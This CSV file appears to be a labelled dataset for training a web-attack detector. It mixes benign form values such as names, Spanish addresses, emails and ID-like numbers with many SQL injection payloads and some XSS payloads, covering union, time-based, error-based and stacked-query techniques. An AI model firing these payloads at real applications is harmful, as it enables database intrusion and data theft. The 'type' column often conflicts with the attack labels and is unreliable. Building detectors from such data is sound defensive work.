Text,attack_type,Label,type
ailn,norm,0,normal
"1') where 9951=9951 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",sqli,1,sql
1) and 3861=5813--,sqli,1,sql
javascript:alert(1)//></video>,xss,2,xss
"-7395%"" order by 1--",sqli,1,sql
jongwoei,norm,0,normal
"calle doctor bove, 65",norm,0,normal
"-5207) where 6987=6987 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
-5585%'))) or 6990=7727,sqli,1,normal
"1)) as wmxa where 6485=6485 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"<img dynid=xss src=""javascript:alert('xss')"">",xss,2,xss
1%' union all select null#,sqli,1,sql
"-7060') or make_set(4233=1689,1689) and ('twpr' like 'twpr",sqli,1,normal
towaij,norm,0,normal
"-7884"" where 3297=3297 or 2492=6158",sqli,1,normal
"camino elorrieta, 193, 2a",norm,0,normal
1%'))) and (9404=8390)*8390 and ((('%'=',sqli,1,normal
rebolledo de la torre,norm,0,normal
"make_set(7729=7729,1)",sqli,1,normal
1)) as qsos where 2721=2721 rlike (select * from (select(sleep(5)))sgvo)--,sqli,1,sql
"1' where 8451=8451 union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
stiller_kimball@socimi.com.ic,norm,0,normal
benchley@11horas.fk,norm,0,normal
deagle,norm,0,normal
"1"") and 4595=4595#",sqli,1,normal
"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",sqli,1,sql
"1"" where 4073=4073 rlike (select (case when (8716=4281) then 1 else 0x28 end))--",sqli,1,sql
"1%""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"-4919) union all select 2608,2608,2608,2608,2608,2608#",sqli,1,sql
1' where 1652=1652 and sleep(5)#,sqli,1,normal
1')) and 3355=6012 and (('ofmy'='ofmy,sqli,1,normal
branden,norm,0,normal
"iglesuela del cid, la",norm,0,normal
"antonio asenjo, 178, 6?h",norm,0,normal
04607227m,norm,0,normal
09205053q,norm,0,normal
"1'))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((('fvbv'='fvbv",sqli,1,sql
80819303v,norm,0,normal
"1%"")) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
1'));select (case when (5418=6516) then 1 else 5418*(select 5418 from master..sysdatabases) end)--,sqli,1,sql
-1<img src=&{document.cookie=true;};>,xss,2,sql
8962,norm,0,normal
c/ castaos 55 6-g,norm,0,normal
"-8364') union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#",sqli,1,sql
11800455y,norm,0,normal
-9553)) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((5299=5299,sqli,1,sql
porras roger,norm,0,normal
"-4955%' union all select 5928,5928--",sqli,1,sql
08490721h,norm,0,normal
gancedo,norm,0,normal
"1'+(select 'ggkm' where 3394=3394;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
swearing,norm,0,normal
orion,norm,0,normal
72nt89ct7v1,norm,0,normal
53087910t,norm,0,normal
chunyen,norm,0,normal
"1"" where 6800=6800 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
4752,norm,0,normal
jaln de cameros,norm,0,normal
-7293'))) or 3038=3038,sqli,1,normal
"calle catedratico eugenio ubeda romero, s/n,",norm,0,normal
zarzuela,norm,0,normal
"1%"") or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (""%""=""",sqli,1,normal
vettenranta@infopromo.az,norm,0,normal
"1"" where 3368=3368 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
loudiadi,norm,0,normal
"1) as svkf where 6503=6503 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"c/ salgueiral, 198",norm,0,normal
"1"" where 1809=1809 and make_set(8403=8403,8899)--",sqli,1,sql
<style><!--</style><script>document.cookie=true;//--></script>,xss,2,xss
sylvie@laspruebascongaseosa.pk,norm,0,normal
1') rlike sleep(5),sqli,1,normal
1)) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((1260=1260,sqli,1,sql
negri-hand@automoviles-hibridos.mo,norm,0,normal
13194,norm,0,normal
"1 and 8407=(select count(*) from generate_series(1,5000000))-- zozj",sqli,1,sql
1emat98,norm,0,normal
02327,norm,0,normal
"calle la revoltosa, 55, 11c",norm,0,normal
"1%"" and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""%""=""",sqli,1,sql
librilla,norm,0,normal
barrio de mu,norm,0,normal
hollywood.hausman@921.th,norm,0,normal
4014,norm,0,normal
57401003h,norm,0,normal
87348482w,norm,0,normal
"1%"")) and sleep(5)#",sqli,1,normal
nien-hwa,norm,0,normal
"1 where 7196=7196 or 8466=benchmark(5000000,md5(0x694a4745))--",sqli,1,sql
"1"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""vnei"" like ""vnei",sqli,1,normal
03nte99era,norm,0,normal
49211,norm,0,normal
"1"") as jiyl where 4893=4893 union all select null,null,null,null,null#",sqli,1,sql
"1"")) as gprr where 5975=5975 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
barranco,norm,0,normal
20500,norm,0,normal
reubens,norm,0,normal
-9429') order by 1--,sqli,1,sql
-4979')) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('ofgg'='ofgg,sqli,1,sql
villafrechs,norm,0,normal
jovina,norm,0,normal
2308021987140157,norm,0,normal
estellesa,norm,0,normal
abramo,norm,0,normal
668,norm,0,normal
"1"")) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"1' or 8421=(select count(*) from generate_series(1,5000000))",sqli,1,sql
"1'+(select 'qpxk' where 7139=7139 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1))+'",sqli,1,sql
7n0ali-2ar,norm,0,normal
"moncayo 46,",norm,0,normal
"1%"");select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
5970,norm,0,normal
walker,norm,0,normal
"1)) as mcyh where 1001=1001;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
9184060552279623,norm,0,normal
583opi4,norm,0,normal
deacetis,norm,0,normal
hedda,norm,0,normal
"1"") union all select null#",sqli,1,sql
c3er2e4ue15,norm,0,normal
"1'))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('bfrq' like 'bfrq",sqli,1,sql
">""<body background=""javascript:document.cookie=true;"">",xss,2,xss
costello_browallius@autoconstruccion.bt,norm,0,normal
92937803r,norm,0,normal
-6145 or (8459=8459)*4906-- yklv,sqli,1,sql
"-7551 or elt(6900=7195,7195)",sqli,1,normal
"1"") as qmtx where 5280=5280 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
ciara,norm,0,normal
87258503e,norm,0,normal
54530952e,norm,0,normal
tartarizar,norm,0,normal
09341,norm,0,normal
1ese3l59ri2l0d3,norm,0,normal
berrocal de huebra,norm,0,normal
"o casal 135, 4?a",norm,0,normal
jiejie,norm,0,normal
f6lo40r06,norm,0,normal
mitsuter,norm,0,normal
6233284855351457,norm,0,normal
"1,(select (case when (5777=5777) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",sqli,1,sql
06225,norm,0,normal
patten,norm,0,normal
1' rlike (select (case when (5384=7060) then 1 else 0x28 end)),sqli,1,sql
cardona,norm,0,normal
bideau@fulanitoymenganito.eh,norm,0,normal
bahabn de esgueva,norm,0,normal
casas de san galindo,norm,0,normal
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'nmat' like 'nmat",sqli,1,sql
bangert,norm,0,normal
castellcir,norm,0,normal
"1')) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('qgdv'='qgdv",sqli,1,normal
"de las aguas, 196",norm,0,normal
vertavillo,norm,0,normal
7znallo,norm,0,normal
agero,norm,0,normal
"-5196""))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""gbcq"" like ""gbcq",sqli,1,sql
1;begin user_lock.sleep(5); end# ckxq,sqli,1,sql
calle pintor el greco 102 1-g,norm,0,normal
navarra,norm,0,normal
-3096' or 3821=5539 and 'zrth'='zrth,sqli,1,normal
"1"") and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""gozk""=""gozk",sqli,1,sql
1));select (case when (9696=2874) then 1 else 9696*(select 9696 from master..sysdatabases) end)--,sqli,1,sql
1) where 9860=9860 and 4443=4111--,sqli,1,sql
9974650930559392,norm,0,normal
diego medina 82 5-b,norm,0,normal
requena,norm,0,normal
cremades@baltasarsantos.kn,norm,0,normal
"1')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((('etzb'='etzb",sqli,1,sql
1);select (case when (2056=1917) then 2056 else 1/(select 0) end)--,sqli,1,sql
zigoitia,norm,0,normal
laspua,norm,0,normal
kai-larsen-picchio6@multasdetransito.net,norm,0,normal
"1 where 9083=9083 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
-7726 or 3038=3038,sqli,1,normal
quitral blasi,norm,0,normal
tiberio,norm,0,normal
"plza. mirto, 135",norm,0,normal
"1"")) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((""nzhj"" like ""nzhj",sqli,1,normal
"1%' or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and '%'='",sqli,1,sql
"1%' or 8421=(select count(*) from generate_series(1,5000000)) and '%'='",sqli,1,sql
-1989%')) or 6179=8518#,sqli,1,normal
"1)) as xvyi where 6701=6701 union all select null,null,null,null#",sqli,1,sql
"1'||(select 'yags' where 6268=6268 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))||'",sqli,1,sql
arriharn espinet,norm,0,normal
cuccu@professionalhosting.com.uz,norm,0,normal
fainstein ferrete,norm,0,normal
aghi,norm,0,normal
5070501276663711,norm,0,normal
9209,norm,0,normal
d1se3cin,norm,0,normal
"-8971'||(select 'smyx' where 7970=7970 union all select 7970,7970,7970,7970,7970,7970,7970#",sqli,1,sql
"1 where 2060=2060;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
p4ot8tor,norm,0,normal
71542361x,norm,0,normal
"1 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))# mpyu",sqli,1,sql
long@todomodelos.tg,norm,0,normal
"-4385%')) union all select 6694,6694,6694,6694,6694,6694,6694,6694,6694,6694#",sqli,1,sql
"1%""))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1 union all select null,null,null,null,null,null--",sqli,1,sql
carol7@faders.com.bi,norm,0,normal
nedar,norm,0,normal
35470,norm,0,normal
"1'));select count(*) from generate_series(1,5000000)--",sqli,1,sql
08256,norm,0,normal
michels,norm,0,normal
"-5438"") union all select 3170,3170--",sqli,1,sql
"1"") as bllz where 6975=6975 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
46970,norm,0,normal
"calle gardenia, 35",norm,0,normal
"1%')));select * from generate_series(5206,5206,case when (5206=2214) then 1 else 0 end) limit 1--",sqli,1,sql
calle codigo correspondencia oficial correos-telegrafos 33,norm,0,normal
8484,norm,0,normal
"1'))) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"1';select count(*) from generate_series(1,5000000) and 'roca'='roca",sqli,1,sql
"'""</script><script>alert('xssya')</script>",xss,2,xss
"1') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ('zypa'='zypa",sqli,1,sql
74469828z,norm,0,normal
1') as ubvf where 5923=5923 and 8490=4925--,sqli,1,sql
"1) where 9338=9338 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",sqli,1,sql
1464,norm,0,normal
"-8312%"")) union all select 4972--",sqli,1,sql
"1') where 7322=7322 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"travesia palacio 61, 1?d",norm,0,normal
6478,norm,0,normal
"1"") as ffon where 2738=2738 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",sqli,1,sql
"1%')) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('%'='",sqli,1,sql
latas,norm,0,normal
1a49e6o301,norm,0,normal
"-7248"") or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""qgms""=""qgms",sqli,1,sql
"travesia uruguay, 172,",norm,0,normal
"1"")) and sleep(5) and ((""timv""=""timv",sqli,1,normal
vyskocil@muchachina.li,norm,0,normal
"1') as hats where 2011=2011 union all select null,null,null,null,null#",sqli,1,sql
ildara,norm,0,normal
"1);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3",sqli,1,sql
"1%"")) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
"reinosa 98, 13-e",norm,0,normal
52382768s,norm,0,normal
"<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:alert('crosssitescripting')""></b></i></xml>",xss,2,sql
"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)",sqli,1,sql
9162334723875086,norm,0,normal
6ong6,norm,0,normal
kirov@ofertachina.fm,norm,0,normal
salavedra castelltort,norm,0,normal
"1"") as oztl where 6655=6655 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
condado de trevio,norm,0,normal
mcdonald,norm,0,normal
59bi8ari7o,norm,0,normal
"1';call regexp_substring(repeat(right(char(3702),0),500000000),null)",sqli,1,sql
1')) as dago where 9788=9788;select (case when (6652=1932) then 6652 else 6652*(select 6652 from information_schema.character_sets) end)#,sqli,1,sql
"losilla, la",norm,0,normal
"<img lowsrc=""javascript:alert('crosssitescripting')"">",xss,2,xss
1)) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((5139=5139,sqli,1,sql
1 rlike (select * from (select(sleep(5)))sgvo)-- saxs,sqli,1,sql
"-2605%'))) union all select 4738,4738#",sqli,1,sql
1)) as uadn where 9588=9588 rlike sleep(5)#,sqli,1,normal
herling,norm,0,normal
"1"") where 5197=5197 and elt(3114=3114,sleep(5))#",sqli,1,normal
romualda,norm,0,normal
"1'+(select mhfn where 2425=2425;select count(*) from generate_series(1,5000000))+'",sqli,1,sql
spindler1,norm,0,normal
felisa,norm,0,normal
02650843r,norm,0,normal
"1,(select (case when (8382=8382) then 1 else 1/(select 0) end))",sqli,1,sql
"1%');select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('%'='",sqli,1,sql
"1)) as debc where 7428=7428 union all select null,null,null#",sqli,1,sql
devette,norm,0,normal
-4775') or 3038=3038,sqli,1,normal
207,norm,0,normal
1%')));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
516?t2r8ro,norm,0,normal
al9ol,norm,0,normal
te3496,norm,0,normal
"1"";call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"-5520"")) as utqk where 7762=7762 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
0401288108131816,norm,0,normal
incesta$r,norm,0,normal
1'||(select 'exls' where 3837=3837 and sleep(5))||',sqli,1,sql
bat3an,norm,0,normal
43376,norm,0,normal
"1%"")) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"1')));iif(7889=5114,1,1/0)",sqli,1,sql
"1%')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('%'='",sqli,1,sql
rohtert,norm,0,normal
1');select sleep(5),sqli,1,sql
cavall monn,norm,0,normal
puntagorda,norm,0,normal
"1')) and 3824=benchmark(5000000,md5(0x76555642)) and (('inrm' like 'inrm",sqli,1,normal
truswell@soybueno.be,norm,0,normal
karn,norm,0,normal
"1"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)",sqli,1,sql
intima,norm,0,normal
nandor,norm,0,normal
"1%""))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""%""=""",sqli,1,sql
"1'+(select ijck where 9961=9961 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))+'",sqli,1,sql
cagafierro,norm,0,normal
5102826995528190,norm,0,normal
nazareth,norm,0,normal
"1"")) as daqd where 4390=4390 and elt(3114=3114,sleep(5))#",sqli,1,normal
"1'+(select taga where 8036=8036;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
schmoe,norm,0,normal
1924183185163738,norm,0,normal
"1') where 9544=9544 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",sqli,1,sql
"1""))) and 3824=benchmark(5000000,md5(0x76555642)) and (((""enfu""=""enfu",sqli,1,normal
allaert@chicasdiabolo.ru,norm,0,normal
1';begin dbms_lock.sleep(5); end and 'wdce'='wdce,sqli,1,sql
lamarr@tardos.mobi,norm,0,normal
sollman,norm,0,normal
raspar,norm,0,normal
"1') where 9381=9381 or elt(6272=6272,sleep(5))--",sqli,1,sql
1') as jdmh where 6175=6175 rlike sleep(5)#,sqli,1,normal
-4713'))) or 4567=1287,sqli,1,normal
-3862') or 9323=9323#,sqli,1,normal
nassiet.birkin@cienciapolicial.gl,norm,0,normal
"1"") where 9359=9359 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"1' or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'wwwb'='wwwb",sqli,1,sql
50779094q,norm,0,normal
"el morejon, s/n 11?d",norm,0,normal
"1' in boolean mode) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))#",sqli,1,normal
"-7796') union all select 4960,4960,4960,4960,4960,4960,4960,4960,4960,4960#",sqli,1,sql
10g2st19,norm,0,normal
01062744y,norm,0,normal
"-1583') or elt(1032=1032,3623) and ('jrcj' like 'jrcj",sqli,1,normal
san vicente de la barquera,norm,0,normal
6759860992373102,norm,0,normal
"1"")) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""quni""=""quni",sqli,1,normal
-9893' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'pbop'='pbop,sqli,1,sql
">""<img src=""javascript:document.cookie=true;"">",xss,2,xss
"1'+(select 'rryx' where 1228=1228 union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
ajmet,norm,0,normal
1477,norm,0,normal
"1""))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (((""ymhg""=""ymhg",sqli,1,sql
estate,norm,0,normal
rivard,norm,0,normal
70075138a,norm,0,normal
1 and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
gargulak,norm,0,normal
carre mamani,norm,0,normal
"1"")) and 9198=9198--",sqli,1,sql
